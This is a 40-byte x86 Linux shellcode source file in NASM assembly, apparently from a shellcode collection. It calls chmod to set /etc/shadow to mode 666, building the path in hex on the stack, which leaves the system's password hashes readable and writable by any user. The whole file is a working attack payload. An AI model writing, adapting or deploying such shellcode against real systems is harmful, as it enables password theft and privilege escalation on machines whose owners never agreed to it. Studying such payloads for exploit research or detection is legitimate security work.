;chmod-shadow.nasm
;this changes the permissions for /etc/shadow to 666
;Linux x86
;Saniv Kawa (@skawasec)
;www.popped.io
;December 6, 2016
;40 bytes
global _start

section .text

_start:
  mov al, 8 ;arithmetic for AL register
  add al, al  ;arithmetic for AL register
  dec al ;AL now contains the correct syscall number, 15
  cdq
  push ecx  ;null terminate
  push word 0x776f  ; wo
  push word 0x6461  ; da
  push word 0x6873  ; hs
  push word 0x2f63  ; /c
  push word 0x7465  ; te
  push word 0x2f2f  ; //
  mov ebx, esp  ;stack pointer
  mov cx, 0666o ; permissions 666
  int 0x80
